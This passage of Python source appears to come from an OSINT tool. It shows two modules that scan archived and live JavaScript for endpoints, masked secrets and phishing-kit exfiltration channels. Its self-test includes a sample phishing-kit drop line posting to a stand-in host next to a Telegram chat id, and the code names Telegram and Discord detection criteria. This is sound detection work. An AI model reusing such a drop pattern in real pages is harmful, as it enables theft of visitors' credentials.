                tags=["credential_exposure", "phishing_kit_exfil"] if s["kit"] else ["credential_exposure"],
                source=source_id,
                key=key[:16],
            )
            evidence.append({"rule": s["rule"], "js_url": a["url"], "js_sha256": a["sha256"], "masked": s["masked"], "excerpt": s["excerpt"]})
    # ---- phishing-kit channels: masked, the endpoint host is the only pivot (c7) ----
    indicators: list[dict[str, Any]] = []
    for a in analyses:
        for k in a["kit"]:
            fp = k.get("token") or k.get("chat_id") or k.get("webhook_id")
            indicators.append({"kind": k["kind"], "host": k.get("host"), "url": k.get("url"), "fingerprint": fp, "requested": False,
                               "js_url": a["url"], **({"credential_form": True} if k.get("credential_form") else {})})
    decided = kit_channels(indicators, site_host)
    channels = decided["channels"]
    if decided["candidates"]:
        # cross-site form/POST targets without any exfiltration signal (newsletter, CRM, search forms): listed only
        res.attr("exfil_channels", [dict(c, candidate=True) for c in decided["candidates"][:50]])
    if channels:
        res.attr("exfil_channels", channels[:50])
        hosts = sorted({c["host"] for c in channels if c.get("host")})
        for host in hosts[:20]:
            res.pivot(T.DOMAIN, host, "exfil_endpoint", confidence="possible", expand=False,
                      note="host a phishing-kit script posts captured data to: never contacted")
        kinds = sorted({c["kind"] for c in channels})
        res.finding(
            "Phishing-kit exfiltration channels in page scripts",
            "medium",
            f"{len(channels)} exfiltration indicator(s) ({', '.join(kinds)}) towards {', '.join(hosts[:5])}; tokens and chat ids are "
            "masked and were never used. Report the channels to the platforms' abuse teams.",
            confidence="probable",
            criterion="Telegram Bot API / Discord webhook patterns, or a credential form posting to another site, in public page "
                      "scripts; cross-site drop endpoints counted only next to such a channel (P068 c7)",
            data={"channels": channels[:20]},
            tags=["phishing_kit_exfil"],
            source=source_id,
        )
    raw = dict(res.raw) if isinstance(res.raw, dict) else {}
    raw.update({"files": files, "secrets": evidence[:50]})
    res.raw = raw


# ======================================================================================
# js_endpoints_archive (PASSIVE, opt-in)
# ======================================================================================

_ARCHIVE_ERRORS = (RateLimited, QuotaExceeded, Blocked, AuthRequired, HttpError, NetworkError, DeadlineExceeded)


@register
class JsEndpointsArchive(Module):
    name = "js_endpoints_archive"
    title = "JavaScript endpoints and secrets from archived JS (Wayback id_ snapshots)"
    description = (
        "Lists the site's archived JavaScript files (Wayback CDX), reads at most 10 raw id_ snapshots and extracts endpoints, "
        "masked secrets and phishing-kit channels; the live site is never contacted."
    )
    category = "url_web"
    accepts = {T.DOMAIN, T.URL}
    produces = {T.URL, T.DOMAIN}
    run_on = "seeds"
    tags = {"free", "slow"}
    reference = "https://github.com/GerbenJavado/LinkFinder"
    terms = "open"  # Internet Archive (trusted, open) + own code; LinkFinder/jsluice/gitleaks ideas MIT
    opsec = Opsec.PASSIVE
    disclosure = "third_party"  # the Internet Archive sees the host and the JS URLs
    provider = "internet_archive"
    sources = (SRC_CDX, SRC_WAYBACK)
    hosts = ("web.archive.org",)
    access_model = "free_noauth_limited"
    max_requests = 11  # one CDX listing + at most 10 id_ snapshots (P068 c1)
    expected_latency = 55.0  # the provider quota paces Wayback at one request per 5 s
    timeout = 120.0
    cache_ttl = 86400
    max_pivots = MAX_PIVOTS + MAX_THIRD_PARTY + 20
    default_enabled = False  # P068 c1: opt-in (more than 10 archive requests per entity)
    notice = "Archive hosts only; secrets are masked and never validated or used; endpoints are listed, never requested."
    settings = {
        "js_endpoints_archive_max_files": SettingSpec(MAX_ARCHIVE_FILES, "js_endpoints_archive: archived JS files read per entity (at most 10, P068 c1)"),
    }

    def run(self, entity: Entity, ctx: Any) -> ModuleResult:
        res = self.result(entity)
        host = ((urlsplit(entity.value).hostname or "") if entity.type is T.URL else entity.value).lower().strip(".")
        params = [("url", f"{host}/*"), ("output", "json"), ("fl", "timestamp,original,digest,statuscode,mimetype"),
                  ("filter", "statuscode:200"), ("filter", "mimetype:.*javascript.*"), ("collapse", "urlkey"), ("limit", "500")]
        try:
            resp = ctx.http.get(CDX, params=params, source=SRC_CDX, ttl=86400, max_bytes=4 * 1024 * 1024)
            ctx.http.check(resp)
        except _ARCHIVE_ERRORS as exc:
            out = failure("wayback_js_listing", exc)
            report_failure(res, SRC_CDX, out)
            return _archive_failure(res, out)
        parsed = parse_cdx_rows(resp.content, row_cap=500)
        if parsed["state"] == "error":
            return res.mark("error", f"could not verify: Wayback CDX answer unusable ({parsed['error']})", reason_code="error")
        try:
            limit = max(0, min(MAX_ARCHIVE_FILES, int(ctx.setting("js_endpoints_archive_max_files", MAX_ARCHIVE_FILES))))
        except (TypeError, ValueError):
            limit = MAX_ARCHIVE_FILES
        newest: dict[str, dict[str, Any]] = {}
        for row in parsed["rows"]:
            url = str(row.get("url") or "")
            if not url.lower().split("?", 1)[0].endswith((".js", ".mjs")) and "javascript" not in str(row.get("mimetype") or ""):
                continue
            if url not in newest or str(row.get("timestamp")) > str(newest[url].get("timestamp")):
                newest[url] = row
        plan = sorted(newest.values(), key=lambda r: str(r.get("timestamp") or ""), reverse=True)
        if not plan:
            res.attr("js_files", {"files": [], "archived_js": 0})
            return res.mark("empty")  # the archive answered: no archived JS of this host
        analyses: list[dict[str, Any]] = []
        failures: list[str] = []
        for row in plan[:limit]:
            snap = archive_snapshot_url("wayback", str(row.get("timestamp") or ""), row.get("url"))
            if not snap:
                failures.append(f"{row.get('url')}: not replayed (credentials or tokens in the URL)")
                continue
            try:
                body = ctx.http.get(snap, source=SRC_WAYBACK, ttl=0, max_bytes=MAX_JS_SCAN_BYTES + 1)
                ctx.http.check(body)
            except _ARCHIVE_ERRORS as exc:
                out = failure("wayback_js_snapshot", exc)
                failures.append(str(out["reason"]))
                if out["status"] in ("rate_limited", "quota", "blocked"):
                    report_failure(res, SRC_WAYBACK, out)
                    break
                continue
            if looks_like_html(body.content[:2048]):
                failures.append(f"{row.get('url')}: the archive answered an HTML page")
                continue
            analyses.append(analyse_js(body.content, str(row.get("url")), source=f"wayback:{row.get('timestamp')}"))
        if not analyses:
            if failures:
                return res.mark("error", "could not verify: " + "; ".join(failures[:3]), reason_code="error")
            return res.mark("empty")
        emit_analysis(res, analyses, site_host=host, owner=_owner(ctx, entity), source_id=SRC_WAYBACK,
                      extra_files={"archived_js": len(plan), "not_read": [r.get("url") for r in plan[limit:limit + 20]]})
        if failures:
            res.partial = True
            res.error = "partial: " + "; ".join(failures[:3])
        return res


def _archive_failure(res: ModuleResult, outcome: Mapping[str, Any]) -> ModuleResult:
    status = str(outcome.get("status"))
    reason = f"could not verify: {outcome.get('reason')}"
    if status == "rate_limited":
        return res.mark("rate_limited", reason, reason_code="rate_limited")
    if status == "quota":
        return res.mark("quota", reason, reason_code="quota")
    if status == "blocked":
        return res.mark("blocked", reason, reason_code=str(outcome.get("reason_code") or "challenge"))
    return res.mark("error", reason, reason_code="timeout" if outcome.get("reason_code") == "timeout" else "error")


# ======================================================================================
# js_endpoints_live (LIGHT, opt-in)
# ======================================================================================


def _selftest(ctx: Any) -> HealthResult:
    """Offline self-test: the tokenizer, the noise filter and the kit masking on in-memory samples."""
    found = extract_endpoints('var a="/api/v1/users?id=1", t="text/html";', "https://selftest.invalid/app.js")
    urls = [e["url"] for e in found["endpoints"]]
    kit = kit_exfil_indicators('$.post("https://drop.example.net/x.php",{}); var chat_id="-100123456"; // api.telegram.org')
    if urls != ["https://selftest.invalid/api/v1/users?id=1"] or len(kit) != 2 or "123456" in str(kit):
        return HealthResult("dead", "analysis self-test failed")
    return HealthResult("ok", "tokenizer, noise filter and kit masking ok")


@register
class JsEndpointsLive(Module):
    name = "js_endpoints_live"
    title = "JavaScript endpoints and secrets of the live site (LIGHT)"
    description = (
        "LIGHT, analyst-typed seeds only: reads the same-site <script src> files of the shared homepage fetch (at most 20 x 2 MB, "
        "referenced source maps at most 5 MB) and extracts endpoints, masked secrets and phishing-kit channels; nothing found is "
        "ever requested or validated."
    )
    category = "url_web"
    accepts = {T.DOMAIN, T.URL}
    produces = {T.URL, T.DOMAIN}
    run_on = "seeds"
    tags = {"free"}
    reference = "https://github.com/GerbenJavado/LinkFinder"
    terms = "open"
    opsec = Opsec.LIGHT
    disclosure = "target"
    hosts = ()
    max_requests = 25  # homepage + <= 20 scripts + source maps, within the LIGHT budget (25 per host per scan)
    expected_latency = 20.0  # LIGHT pacing: 1 request per second per host
    timeout = 90.0
    min_interval = 1.0
    max_rate = 1.0
    max_pivots = MAX_PIVOTS + MAX_THIRD_PARTY + 20
    default_enabled = False  # LIGHT is never default (A3)
    notice = (
        "LIGHT: ordinary GETs of the page's own scripts (a browser downloads the same files) with ua_light. Secrets are masked and "
        "never validated or used (Lei 12.737/2012); endpoints are listed, never requested."
    )
    settings = {
        "js_endpoints_live_max_files": SettingSpec(MAX_JS_FILES, "js_endpoints_live: same-site scripts fetched per seed (at most 20, P068 c3)"),
        "js_endpoints_live_max_maps": SettingSpec(MAX_SOURCE_MAPS, "js_endpoints_live: referenced source maps fetched per seed (5 MB each)"),
        "js_endpoints_live_cdn_suffixes": SettingSpec([], "js_endpoints_live: own CDN host suffixes treated as the site (still inside the seed)"),
    }

    @classmethod
    def health_check(cls) -> HealthCheck:
        return HealthCheck(offline=True, selftest=_selftest)

    def run(self, entity: Entity, ctx: Any) -> ModuleResult:
        res = self.result(entity)
        if not getattr(ctx, "is_seed", True):
            return res.mark("skipped", "LIGHT runs only on analyst-typed seeds, never on pivots (A7)", reason_code="scope")
        page = fetch_homepage(ctx, entity)
        if page.refused and not page.history and not page.status:
            return res.mark("skipped", f"seed not fetched: {page.refused}", reason_code="policy")
        if page.blocked:
            code = page.blocked_code if page.blocked_code in ("challenge", "geo_block", "login_wall", "circuit", "hostile_host") else "challenge"
            if page.blocked_status == "rate_limited":
                return res.mark("rate_limited", f"could not verify: the homepage is rate limited ({page.blocked})", reason_code="rate_limited")
            return res.mark("blocked", f"could not verify: the homepage answered a block page ({page.blocked})", reason_code=code)
        if not (200 <= page.status < 300) or not looks_like_html(page.body):
            why = f" ({_mask_text(page.refused)})" if page.refused else ""
            return res.mark("error", f"could not verify: the homepage answered HTTP {page.status or '-'} without an HTML page{why}",
                            reason_code="error")
        site_host = (urlsplit(page.url).hostname or "").lower()
        cdns = ctx.setting("js_endpoints_live_cdn_suffixes", []) or []
        cdns = [str(c) for c in cdns] if isinstance(cdns, list) else []
        try:
            max_files = max(0, min(MAX_JS_FILES, int(ctx.setting("js_endpoints_live_max_files", MAX_JS_FILES))))
            max_maps = max(0, min(MAX_SOURCE_MAPS, int(ctx.setting("js_endpoints_live_max_maps", MAX_SOURCE_MAPS))))
        except (TypeError, ValueError):
            max_files, max_maps = MAX_JS_FILES, MAX_SOURCE_MAPS
        scripts = extract_script_srcs(page.body, page.url, cdn_suffixes=cdns, max_files=max_files)
        # the page itself: its inline scripts like a JS file, its forms and inline code for kit channels (c7)
        page_analysis = analyse_js(inline_scripts(page.body), page.url, page_url=page.url, source="inline")
        page_analysis["kit"] = kit_exfil_indicators(page.body, page.url)
        analyses: list[dict[str, Any]] = [page_analysis]
        not_fetched: list[dict[str, str]] = [{"url": u, "reason": "budget (at most 20 scripts, P068 c3)"} for u in scripts["not_fetched_budget"]]
        refused: list[dict[str, str]] = []
        maps: list[dict[str, Any]] = []
        map_queue: list[tuple[str, str]] = []
        stopped = False
        queue = list(scripts["fetch"])
        while queue:
            url = queue.pop(0)
            why = check_target(url, site_host=site_host, seed_hosts=_seed_hosts(entity), cdn_suffixes=cdns,
                               allowed_ports=seed_ports(entity), internal_hosts=internal_seed_hosts(ctx, entity))
            if why:
                refused.append({"url": url, "reason": why})
                continue
            try:
                fetched = safe_get(ctx, url, accept=JS_ACCEPT, max_bytes=MAX_JS_SCAN_BYTES, entity=entity, site_host=site_host,
                                   cdn_suffixes=cdns, max_hops=2, ttl=0)
            except RequestCapReached:
                stopped = True
                not_fetched.extend({"url": u, "reason": "budget (LIGHT request budget reached)"} for u in [url, *queue])
                break
            except PolicyError as exc:
                refused.append({"url": url, "reason": str(exc)[:200]})
                continue
            except (Blocked, RateLimited, QuotaExceeded, NetworkError, HttpError) as exc:
                refused.append({"url": url, "reason": f"could not fetch: {str(exc)[:160]}"})
                continue
            if fetched.refused or fetched.blocked or not (200 <= fetched.status < 300) or looks_like_html(fetched.body[:2048]):
                refused.append({"url": url, "reason": fetched.refused or fetched.blocked or f"HTTP {fetched.status} or an HTML page"})
                continue
            analysis = analyse_js(fetched.body, fetched.url, page_url=page.url)
            analyses.append(analysis)
            ref = find_source_map_url(fetched.body, fetched.url, fetched.headers) or analysis.get("source_map")
            if ref and ref.get("url") and len(map_queue) < max_maps:
                map_queue.append((ref["url"], fetched.url))
        for map_url, js_url in map_queue if not stopped else []:
            why = check_target(map_url, site_host=site_host, seed_hosts=_seed_hosts(entity), cdn_suffixes=cdns,
                               allowed_ports=seed_ports(entity), internal_hosts=internal_seed_hosts(ctx, entity))
            if why:
                maps.append({"url": map_url, "js": js_url, "state": "refused", "reason": why})
                continue
            try:
                fetched = safe_get(ctx, map_url, accept=MAP_ACCEPT, max_bytes=MAX_SOURCE_MAP_BYTES, entity=entity, site_host=site_host,
                                   cdn_suffixes=cdns, max_hops=2, ttl=0)
            except RequestCapReached:
                stopped = True
                maps.append({"url": map_url, "js": js_url, "state": "not_fetched", "reason": "budget"})
                break
            except (PolicyError, Blocked, RateLimited, QuotaExceeded, NetworkError, HttpError) as exc:
                maps.append({"url": map_url, "js": js_url, "state": "refused", "reason": str(exc)[:160]})
                continue
            if not fetched.ok or fetched.truncated:
                maps.append({"url": map_url, "js": js_url, "state": "absent" if fetched.status == 404 else "unusable",
                             "reason": fetched.refused or fetched.blocked or f"HTTP {fetched.status}"})
                continue
            parsed = parse_source_map(fetched.body)
            if not parsed["ok"]:
                maps.append({"url": map_url, "js": js_url, "state": "invalid", "reason": parsed["reason"]})
                continue
            maps.append({"url": map_url, "js": js_url, "state": "present", "n_sources": parsed["n_sources"], "sources": parsed["sources"][:50],
                         "has_sources_content": parsed["has_sources_content"], "node_modules": parsed["node_modules"]})
            if parsed["sources_content"]:
                analyses.append(analyse_js(parsed["sources_content"], map_url, page_url=page.url, source="source_map"))
        for url in scripts["third_party"][:MAX_THIRD_PARTY]:
            host = (urlsplit(url).hostname or "").lower()
            if host:
                res.pivot(T.DOMAIN, registrable(host), "links_to", confidence="confirmed", expand=False,
                          note="third-party script host of the page: never fetched")
        # page-derived URLs (script srcs, map references, core refusal texts) are masked before they are stored (c5)
        if maps:
            res.attr("js_source_maps", _mask_rows(maps, "url", "js"))
        refused_rows = _mask_rows(refused[:50], "url")
        res.raw = {"homepage": {"url": _mask_url(page.url)[0], "status": page.status, "from_cache": page.from_cache}, "refused": refused_rows}
        emit_analysis(res, analyses, site_host=site_host, owner=_owner(ctx, entity),
                      extra_files={"not_fetched": _mask_rows(not_fetched[:50], "url"), "refused": refused_rows,
                                   "third_party_scripts": [_mask_url(u)[0] for u in scripts["third_party"][:50]],
                                   "inline_scripts": scripts["inline_scripts"]})
        if stopped:
            return res.stop("request_cap")
        return res


def _seed_hosts(entity: Entity) -> tuple[str, ...]:
    from v3lum.core.http import entity_hosts

    return entity_hosts(entity)


_URL_IN_TEXT_RE = re.compile(r"https?://[^\s'\"<>]{1,2048}")


def _mask_text(text: Any) -> str:
    """URLs inside a free-text reason (core refusal messages quote the target) masked like endpoints."""
    return _URL_IN_TEXT_RE.sub(lambda m: _mask_url(m.group(0))[0], str(text or ""))


def _mask_rows(rows: Iterable[Mapping[str, Any]], *url_keys: str) -> list[dict[str, Any]]:
    """Rows of {url, reason...} with their URL fields and reason text masked (tokens, e-mails, secrets)."""
    out = []
    for row in rows:
        item = dict(row)
        for key in url_keys:
            if item.get(key):
                item[key] = _mask_url(str(item[key]))[0]
        if item.get("reason"):
            item["reason"] = _mask_text(item["reason"])
        out.append(item)
    return out
